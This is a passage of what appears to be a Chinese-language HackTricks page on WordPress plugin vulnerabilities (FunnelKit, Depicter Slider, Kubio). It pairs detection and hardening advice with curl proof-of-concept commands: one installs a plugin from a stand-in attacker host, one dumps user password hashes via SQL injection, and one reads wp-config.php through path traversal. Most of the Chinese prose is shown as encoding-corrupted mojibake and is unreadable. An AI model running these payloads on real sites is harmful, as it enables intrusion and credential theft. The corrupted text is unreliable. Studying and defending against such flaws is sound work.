- å¯¹äºä»»ä½•æœ‰ç‰¹æƒçš„ REST è·¯ç”±ï¼šè¦æ±‚ permission_callback å¼ºåˆ¶æ‰§è¡Œ current_user_can() æ¥æ£€æŸ¥æ‰€éœ€çš„ capability
- ä¸è¦åŸºäºå®¢æˆ·ç«¯æä¾›çš„èº«ä»½å‘æ”¾é•¿æœŸæœ‰æ•ˆçš„å¯†é’¥ï¼›å¦‚ç¡®æœ‰å¿…è¦ï¼Œåº”åœ¨è®¤è¯åå‘æ”¾çŸ­æœŸã€ç»‘å®šç”¨æˆ·çš„ tokensï¼Œå¹¶åœ¨ä½¿ç”¨æ—¶é‡æ–°æ£€æŸ¥ capability
- éªŒè¯è°ƒç”¨è€…çš„ç”¨æˆ·ä¸Šä¸‹æ–‡ï¼ˆä»…è°ƒç”¨ wp_set_current_user ä¸è¶³ä»¥è¯æ˜ï¼‰å¹¶æ‹’ç»æ»¡è¶³ !is_user_logged_in() || !current_user_can(<cap>) çš„è¯·æ±‚

---

## Nonce gate misuse â†’ æœªè®¤è¯çš„ä»»æ„æ’ä»¶å®‰è£… (FunnelKit Automations â‰¤ 3.5.3)

Nonces æ˜¯ç”¨æ¥é˜²æ­¢ CSRF çš„ï¼Œä¸æ˜¯ç”¨æ¥åšæˆæƒã€‚å¦‚æœä»£ç å°† nonce éªŒè¯é€šè¿‡è§†ä¸ºé€šè¡Œè¯ï¼Œç„¶åè·³è¿‡å¯¹ç‰¹æƒæ“ä½œï¼ˆä¾‹å¦‚ install/activate pluginsï¼‰çš„ capability æ£€æŸ¥ï¼Œæœªè®¤è¯çš„æ”»å‡»è€…å¯ä»¥æ»¡è¶³ä¸€ä¸ªå¼± nonce è¦æ±‚å¹¶é€šè¿‡å®‰è£…å¸¦åé—¨æˆ–å­˜åœ¨æ¼æ´çš„æ’ä»¶è¾¾åˆ° RCEã€‚

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce â€œpassesâ€
- Impact: full compromise via arbitrary plugin install/activation

PoCï¼ˆå…·ä½“å½¢å¼å–å†³äºæ’ä»¶ï¼›ä»…ä½œç¤ºä¾‹ï¼‰
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
æ£€æµ‹æ¸…å•
- ä¿®æ”¹æ’ä»¶/ä¸»é¢˜çš„ REST/AJAX å¤„ç†ç¨‹åºä»…ä½¿ç”¨ wp_verify_nonce()/check_admin_referer()ï¼Œä¸”æ²¡æœ‰æƒé™æ£€æŸ¥
- åœ¨ nonce éªŒè¯ä¹‹åå°† $skip_caps = true çš„ä»»ä½•ä»£ç è·¯å¾„

åŠ å›º
- å§‹ç»ˆä»…å°† nonces è§†ä¸º CSRF tokensï¼›ä¸è®º nonce çŠ¶æ€å¦‚ä½•ï¼Œéƒ½è¦å¼ºåˆ¶æ‰§è¡Œæƒé™æ£€æŸ¥
- åœ¨åˆ°è¾¾å®‰è£…å™¨ä»£ç ä¹‹å‰ï¼Œè¦æ±‚ current_user_can('install_plugins') å’Œ current_user_can('activate_plugins')
- æ‹’ç»æœªè®¤è¯è®¿é—®ï¼›é¿å…ä¸ºé«˜æƒé™æµç¨‹æš´éœ² nopriv AJAX actions

---

## depicter-* actions ä¸­é€šè¿‡ s (search) å‚æ•°è§¦å‘çš„æœªè®¤è¯ SQLiï¼ˆDepicter Slider â‰¤ 3.6.1ï¼‰

å¤šä¸ª depicter-* actions ä½¿ç”¨äº† s (search) å‚æ•°ï¼Œå¹¶å°†å…¶æ‹¼æ¥è¿› SQL æŸ¥è¯¢ï¼Œæœªä½¿ç”¨å‚æ•°åŒ–ã€‚

- å‚æ•°ï¼šs (search)
- ç¼ºé™·ï¼šåœ¨ WHERE/LIKE å­å¥ä¸­ç›´æ¥è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼›æœªä½¿ç”¨é¢„å¤„ç†è¯­å¥æˆ–è¾“å…¥æ¸…ç†
- å½±å“ï¼šæ•°æ®åº“æ•°æ®å¤–æ³„ï¼ˆç”¨æˆ·ã€å“ˆå¸Œï¼‰ï¼Œå¯èƒ½å¯¼è‡´æ¨ªå‘ç§»åŠ¨

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
æ£€æµ‹æ¸…å•
- grep æŸ¥æ‰¾ depicter-* action handlers å¹¶æ£€æŸ¥åœ¨ SQL ä¸­ç›´æ¥ä½¿ç”¨ $_GET['s'] æˆ– $_POST['s']
- å®¡æŸ¥ä¼ å…¥ $wpdb->get_results()/query() ä¸”å¯¹ s è¿›è¡Œæ‹¼æ¥çš„è‡ªå®šä¹‰æŸ¥è¯¢

åŠ å›º
- å§‹ç»ˆä½¿ç”¨ $wpdb->prepare() æˆ– wpdb å ä½ç¬¦ï¼›åœ¨æœåŠ¡å™¨ç«¯æ‹’ç»æ„å¤–çš„å…ƒå­—ç¬¦
- ä¸º s æ·»åŠ ä¸¥æ ¼çš„å…è®¸åˆ—è¡¨å¹¶è§„èŒƒåŒ–ä¸ºé¢„æœŸçš„å­—ç¬¦é›†/é•¿åº¦

---

## æ— éœ€è®¤è¯çš„ Local File Inclusionï¼ˆé€šè¿‡æœªéªŒè¯çš„ template/æ–‡ä»¶è·¯å¾„ï¼‰ (Kubio AI Page Builder â‰¤ 2.5.1)

åœ¨ template å‚æ•°ä¸­æ¥å—å¯è¢«æ”»å‡»è€…æ§åˆ¶çš„è·¯å¾„è€Œä¸è¿›è¡Œè§„èŒƒåŒ–/é™åˆ¶ï¼Œä¼šå…è®¸è¯»å–ä»»æ„æœ¬åœ°æ–‡ä»¶ï¼›å¦‚æœå°†å¯è¢«åŒ…å«çš„ PHP æˆ– log æ–‡ä»¶æ‹‰å…¥è¿è¡Œæ—¶ï¼ŒæŸäº›æƒ…å†µä¸‹ç”šè‡³å¯èƒ½å¯¼è‡´ä»£ç æ‰§è¡Œã€‚

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: æ²¡æœ‰è§„èŒƒåŒ–/å…è®¸åˆ—è¡¨ï¼›å…è®¸éå†
- Impact: æ•æ„Ÿä¿¡æ¯æ³„éœ² (wp-config.php)ï¼Œåœ¨ç‰¹å®šç¯å¢ƒä¸‹å¯èƒ½å¯¼è‡´ RCEï¼ˆlog poisoningã€å¯è¢«åŒ…å«çš„ PHPï¼‰

PoC â€“ è¯»å– wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Detection checklist
- ä»»ä½•å°†è¯·æ±‚è·¯å¾„æ‹¼æ¥åˆ° include()/require()/read sink çš„å¤„ç†ç¨‹åºï¼Œä¸”æœªä½¿ç”¨ realpath() è¿›è¡ŒåŒ…å«é™åˆ¶
- å¯»æ‰¾åˆ°è¾¾é¢„æœŸ templates ç›®å½•ä¹‹å¤–çš„éå†æ¨¡å¼ (../)

Hardening
- å¼ºåˆ¶ä½¿ç”¨ç™½åå•æ¨¡æ¿ï¼›ä½¿ç”¨ realpath() è§£æå¹¶è¦æ±‚ str_starts_with(realpath(file), realpath(allowed_base))
- è§„èŒƒåŒ–è¾“å…¥ï¼›æ‹’ç»ç›®å½•éå†åºåˆ—å’Œç»å¯¹è·¯å¾„ï¼›ä»…åœ¨æ–‡ä»¶åä¸Šä½¿ç”¨ sanitize_file_name()ï¼ˆä¸è¦ç”¨äºå®Œæ•´è·¯å¾„ï¼‰


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025â€™s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
